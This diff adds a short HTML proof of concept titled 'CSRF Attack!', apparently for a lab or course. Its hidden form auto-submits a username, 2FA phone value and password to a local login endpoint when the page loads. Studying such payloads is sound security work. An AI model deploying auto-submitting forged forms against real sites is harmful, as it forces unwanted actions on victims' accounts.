@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack!</title>
+</head>
+<body>
+    <form action="http://localhost:5000/login" method="POST">
+        <input type="hidden" id="uname" name="username" value="test_user"/>
+        <input type="hidden" id="2fa" name="phone" value="1111111"/>
+        <input type="hidden" id="pword" name="password" value="12345"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
